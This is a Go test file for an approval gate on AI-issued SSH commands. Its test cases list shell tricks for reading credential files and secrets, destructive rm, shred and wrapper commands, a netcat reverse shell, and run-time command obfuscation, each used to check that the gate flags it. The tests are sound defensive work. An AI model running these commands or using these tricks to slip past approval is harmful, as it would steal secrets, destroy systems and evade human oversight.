package main

import "testing"

// Regressions from the v1.0.33 retest (N1, N2, N3): shell tricks must not
// skip approval.
func TestAIToolApprovalClosesShellBypasses(t *testing.T) {
	cases := []struct {
		mode, command, policy string
	}{
		// N1: globs, braces and $HOME that can expand to secrets.
		{"review", "cat /etc/sh*", "sensitive"},
		{"auto", "cat /etc/sh*", "sensitive"},
		{"auto", "cat /etc/sh?dow", "sensitive"},
		{"auto", "cat /etc/sh[a]dow", "sensitive"},
		{"auto", "cat ~/.s*/id_*", "sensitive"},
		{"auto", "cat /root/.ss?/*", "sensitive"},
		{"auto", "cat /etc/{passwd,shadow}", "sensitive"},
		{"auto", "head -n 5 /etc/*shadow*", "sensitive"},
		{"auto", "cat $HOME/.a*/cred*", "sensitive"},
		{"auto", "cat /home/*/.env*", "sensitive"},
		{"auto", "cat /etc/ssh/ssh_host_ed25519_key", "sensitive"},
		{"auto", "cat /etc/ssh/ssh_host_*_key", "sensitive"},
		{"auto", "cat ~/.npmrc", "sensitive"},
		{"auto", "cat ~/.config/gh/hosts.yml", "sensitive"},
		{"auto", "grep -r token /proc/*/environ", "sensitive"},
		// Secrets printed to the AI provider.
		{"auto", "env", "sensitive"},
		{"auto", "printenv", "sensitive"},
		{"auto", "sudo env", "sensitive"},
		{"auto", "export -p", "sensitive"},
		{"auto", "kubectl get secrets -A", "sensitive"},
		{"auto", "kubectl get secret db -o yaml", "sensitive"},
		{"review", "kubectl get secrets -A", "sensitive"},
		// N2: dangerous commands behind wrappers or quoting.
		{"auto", "find /data -delete", "dangerous"},
		{"auto", "find /data -name '*.log' -exec rm -f {} \\;", "dangerous"},
		{"auto", "find . -type f -execdir shred -u {} +", "dangerous"},
		{"auto", "bash -c 'rm -rf /tmp/x'", "dangerous"},
		{"auto", "sh -c \"rm -rf /\"", "dangerous"},
		{"auto", "bash -lc 'cd /srv && rm -rf data'", "dangerous"},
		{"auto", "su -c 'reboot' root", "dangerous"},
		{"auto", "ssh other-host rm -rf /", "dangerous"},
		{"auto", "ssh -p 2222 -i key other 'systemctl stop nginx'", "dangerous"},
		{"auto", "\\rm -rf /x", "dangerous"},
		{"auto", "r\"m\" -rf /x", "dangerous"},
		{"auto", "'rm' -rf /x", "dangerous"},
		{"auto", "command rm -rf /x", "dangerous"},
		{"auto", "xargs -0 rm < list", "dangerous"},
		{"auto", "sed -i s/a/b/ /etc/hosts", "dangerous"},
		{"auto", "sed -Ei.bak 's/a/b/' app.conf", "dangerous"},
		{"auto", "sed --in-place=.bak s/a/b/ x", "dangerous"},
		{"auto", "perl -pi -e 's/a/b/' x", "dangerous"},
		{"auto", "python3 -c 'import os;os.system(\"rm -rf /\")'", "dangerous"},
		{"auto", "python3 -c 'import shutil; shutil.rmtree(\"/srv\")'", "dangerous"},
		{"auto", "mv /etc/passwd /tmp", "dangerous"},
		{"auto", "cp /dev/null /etc/passwd", "dangerous"},
		{"auto", "cp -t /usr/bin evil", "dangerous"},
		{"auto", "echo x | tee /etc/hosts", "dangerous"},
		{"auto", "chmod 777 /etc", "dangerous"},
		{"auto", "chown -R nobody /srv", "dangerous"},
		{"auto", "apt remove -y nginx", "dangerous"},
		{"auto", "apt-get purge nginx", "dangerous"},
		{"auto", "yum erase httpd", "dangerous"},
		{"auto", "pacman -Rns foo", "dangerous"},
		{"auto", "pip uninstall -y requests", "dangerous"},
		{"auto", "unlink /srv/app/current", "dangerous"},
		{"auto", "nc -e /bin/sh 10.0.0.1 4444", "dangerous"},
		{"auto", "git checkout -- .", "dangerous"},
		// Program computed at run time.
		{"auto", "$(echo rm) -rf /x", "opaque"},
		{"auto", "`echo rm` -rf /x", "opaque"},
		{"auto", "$CMD /x", "opaque"},
		{"auto", "eval \"$X\"", "opaque"},
		{"auto", "ls && $(printf rm) x", "opaque"},
		// N3: read-only looking commands that write files.
		{"review", "git diff --output=/tmp/x", "unverified"},
		{"review", "git log --output=/tmp/x", "unverified"},
		{"review", "git show HEAD --output /tmp/x", "unverified"},
		{"review", "tree -o /tmp/x", "unverified"},
		{"review", "tree --output=/tmp/x /etc", "unverified"},
		{"review", "date -s 2020-01-01", "unverified"},
	}
	for _, tc := range cases {
		got := aiToolApproval(tc.mode, "ssh_exec", "", tc.command, "", false)
		if !got.Required || got.Policy != tc.policy {
			t.Errorf("%s %q: got %+v, want policy %q", tc.mode, tc.command, got, tc.policy)
		}
	}
}

func TestAIToolApprovalKeepsCommonCommandsQuiet(t *testing.T) {
	quiet := map[string][]string{
		"auto": {
			"ls -la", "ls *.log", "ls ~", "ls ~/*",
			"systemctl status nginx", "find /var/log -name '*.gz'", "docker ps", "kubectl get pods", "git diff --no-ext-diff --no-textconv HEAD~1",
			"git status", "git log -n 5 --oneline", "df -h", "ps aux | grep nginx | head -20",
			"journalctl -u nginx -n 50 --no-pager 2>/dev/null", "du -sh /var/log", "free -m", "uname -a",
		},
		"review": {
			"ls -la", "ls *.log", "git diff --no-ext-diff --no-textconv HEAD", "git log -n 5 --oneline", "tree -L 2 /srv",
			"date +%s", "date -I", "hostname -f",
		},
	}
	for mode, commands := range quiet {
		for _, command := range commands {
			if got := aiToolApproval(mode, "ssh_exec", "", command, "", false); got.Required {
				t.Errorf("%s %q unexpectedly needs approval: %+v", mode, command, got)
			}
		}
	}
}

// TestAIToolApprovalAutoModeIsAllowlist: automatic mode no longer runs
// everything that is not known to be dangerous; anything that is not
// provably read-only asks first.
func TestAIToolApprovalAutoModeIsAllowlist(t *testing.T) {
	for _, command := range []string{
		"echo $PATH", "echo \"$(date)\"", "awk '{print $1 }' /var/log/syslog", "cp a.txt b.txt", "mv /tmp/a /tmp/b",
		"sed -n 1,5p /etc/hosts", "bash -c 'ls -la'", "ssh other uptime", "chmod 644 ./app.conf", "apt list --installed",
		"pip install requests", "tar czf /tmp/x.tgz /srv/app", "env FOO=1 make test", "x=$(date); echo $x",
		"find . -name '*.go' -exec grep -l foo {} +", "ls && whoami", "ls; whoami", "ls > /tmp/x", "./run.sh",
	} {
		if got := aiToolApproval("auto", "ssh_exec", "", command, "", false); !got.Required {
			t.Errorf("auto %q runs without approval", command)
		}
	}
}

func TestAIShellFieldsRemovesQuoting(t *testing.T) {
	got := aiShellFields(`\rm r"m" 'a b' "c\"d" e\ f`)
	want := []string{"rm", "rm", "a b", `c"d`, "e f"}
	if len(got) != len(want) {
		t.Fatalf("got %q", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("got %q, want %q", got, want)
		}
	}
}
